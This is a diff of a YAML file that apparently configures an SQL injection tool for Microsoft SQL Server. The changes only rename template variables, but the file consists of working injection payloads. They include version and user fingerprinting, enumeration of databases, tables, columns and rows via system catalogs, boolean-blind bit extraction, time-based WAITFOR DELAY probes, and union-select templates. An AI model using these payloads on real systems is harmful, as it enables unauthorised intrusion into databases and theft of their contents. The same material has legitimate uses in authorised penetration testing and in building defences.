@@ -3,11 +3,11 @@ resource:
  info: |
   SELECT 
       %20@@version
-      %2B'${ENCLOSE_VALUE_SQL}'
+      %2B'${enclose_value_sql}'
       %2BDB_NAME()
-      %2B'${ENCLOSE_VALUE_SQL}'
+      %2B'${enclose_value_sql}'
       %2Buser
-      %2B'${TRAIL_SQL}'
+      %2B'${trail_sql}'
       
  schema: 
   database: |
@@ -21,9 +21,9 @@ resource:
                        (
                            SELECT replace(sys.fn_varbintohexstr(CAST(
                                ','
-                               %2b'${ENCLOSE_VALUE_SQL}'
+                               %2b'${enclose_value_sql}'
                                %2BCAST(name AS VARCHAR(MAX))
-                               %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                               %2B'${separator_qte_sql}0${enclose_value_sql}'
                                AS VARBINARY(MAX)
                            )),'0x','')
                            FROM (
@@ -33,7 +33,7 @@ resource:
                                from master..sysdatabases
                            )x
                            where 1=1
-                           {limit}
+                           ${limit}
                            FOR XML PATH('')
                        ),
                        1,
@@ -43,9 +43,9 @@ resource:
                    2
                )
            ) 
-           %2B '${TRAIL_SQL}',
+           %2B '${trail_sql}',
            ',',
-           '${SEPARATOR_CELL_SQL}'
+           '${separator_cell_sql}'
        )
        
   table: |
@@ -59,20 +59,20 @@ resource:
                        (
                            SELECT replace(sys.fn_varbintohexstr(CAST(
                                ','
-                               %2b'${ENCLOSE_VALUE_SQL}'
+                               %2b'${enclose_value_sql}'
                                %2BCAST(name AS VARCHAR(MAX))
-                               %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                               %2B'${separator_qte_sql}0${enclose_value_sql}'
                                AS VARBINARY(MAX)
                            )),'0x','')
                            FROM (
                                select 
                                    name, 
                                    ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
-                               from ${DATABASE}..sysobjects 
+                               from ${database}..sysobjects 
                                WHERE xtype='U'
                            )x
                            where 1=1
-                           {limit}
+                           ${limit}
                            FOR XML PATH('')
                        ),
                        1,
@@ -82,9 +82,9 @@ resource:
                    2
                )
            ) 
-           %2B '${TRAIL_SQL}',
+           %2B '${trail_sql}',
            ',',
-           '${SEPARATOR_CELL_SQL}'
+           '${separator_cell_sql}'
        )
        
   column: |
@@ -98,9 +98,9 @@ resource:
                        (
                            SELECT replace(sys.fn_varbintohexstr(CAST(
                                ','
-                               %2b'${ENCLOSE_VALUE_SQL}'
+                               %2b'${enclose_value_sql}'
                                %2BCAST(name AS VARCHAR(MAX))
-                               %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                               %2B'${separator_qte_sql}0${enclose_value_sql}'
                                AS VARBINARY(MAX)
                            )),'0x','')
                            FROM (
@@ -108,13 +108,13 @@ resource:
                                    c.name, 
                                    ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
                                FROM
-                                   ${DATABASE}..syscolumns c,
-                                   ${DATABASE}..sysobjects t
+                                   ${database}..syscolumns c,
+                                   ${database}..sysobjects t
                                WHERE c.id=t.id
-                               AND t.name='${TABLE}'
+                               AND t.name='${table}'
                            )x
                            where 1=1
-                           {limit}
+                           ${limit}
                            FOR XML PATH('')
                        ),
                        1,
@@ -124,9 +124,9 @@ resource:
                    2
                )
            )
-           %2B '${TRAIL_SQL}',
+           %2B '${trail_sql}',
            ',',
-           '${SEPARATOR_CELL_SQL}'
+           '${separator_cell_sql}'
        )
        
   row: 
@@ -142,19 +142,19 @@ resource:
                             SELECT 
                                 replace(sys.fn_varbintohexstr(CAST(
                                     ','
-                                    %2b'${ENCLOSE_VALUE_SQL}'
-                                    %2BCAST(${FIELDS} AS VARCHAR(MAX))
-                                    %2B'${SEPARATOR_QTE_SQL}0${ENCLOSE_VALUE_SQL}'
+                                    %2b'${enclose_value_sql}'
+                                    %2BCAST(${fields} AS VARCHAR(MAX))
+                                    %2B'${separator_qte_sql}0${enclose_value_sql}'
                                     AS VARBINARY(MAX)
                                 )),'0x','')
                             FROM (
                                 select 
                                     *, 
                                     ROW_NUMBER() OVER (ORDER BY(SELECT 1)) AS rnum 
-                                FROM ${DATABASE}.dbo.${TABLE}
+                                FROM ${database}.dbo.${table}
                             )x
                             where 1=1
-                            {limit}
+                            ${limit}
                             FOR XML PATH('')
                         ),
                         1,
@@ -164,16 +164,16 @@ resource:
                     2
                 )
             )
-            %2B '${TRAIL_SQL}',
+            %2B '${trail_sql}',
             ',',
-            '${SEPARATOR_CELL_SQL}'
+            '${separator_cell_sql}'
         )
    fields: 
     field: |
      LTRIM(
          RTRIM(
              coalesce(
-                 ${FIELD}, 
+                 ${field}, 
                  ''
              )
          )
@@ -185,16 +185,16 @@ strategy:
   slidingWindow: |
    (
        select 
-           '${LEAD}'
+           '${lead}'
            %2Bsubstring(
-               (${INJECTION}), 
-               ${INDEX}, 
+               (${injection}), 
+               ${index}, 
                65536
            )
    )
-  limit: and rnum BETWEEN ${LIMIT} AND 65536
-  failsafe: CONVERT(varchar, (1337${INDICE}7330%2b1))
-  calibrator: replicate(${CALIBRATOR_HEX}, 1024)
+  limit: and rnum BETWEEN ${limit.value} AND 65536
+  failsafe: CONVERT(varchar, (1337${indice}7330%2b1))
+  calibrator: replicate(${calibrator_hex}, 1024)
   limitBoundary: 1
   endingComment: --+-
   fingerprint: 
@@ -203,8 +203,8 @@ strategy:
     - SQL Server
     
  normal: 
-  indices: union select ${INDICES}
-  capacity: (select concat('${LEAD}${INDICE}', ${CALIBRATOR}))
+  indices: union select ${indices}
+  capacity: (select concat('${lead}${indice}', ${calibrator}))
   orderBy: order by 1337
   
  boolean: 
@@ -228,20 +228,20 @@ strategy:
     0 != (
         ascii(
             substring(
-                ${INJECTION}, 
-                ${INDEX}, 
+                ${injection}, 
+                ${index}, 
                 1
             )
         ) 
-        %26 ${BIT}
+        %26 ${bit}
     )
-   length: len(${INJECTION}) > ${INDEX}
+   length: len(${injection}) > ${index}
   modeAnd: and
   modeOr: or
-  blind: ${BOOLEAN.MODE} ${TEST}
+  blind: ${boolean.mode} ${test}
   # TODO no boolean mode here on Time for sqlserver
   time: |
-   ; if (${TEST}) 
+   ; if (${test}) 
        WAITFOR DELAY '00:00:00' 
    else 
-       WAITFOR DELAY '00:00:${SLEEP_TIME}'
+       WAITFOR DELAY '00:00:${sleep_time}'
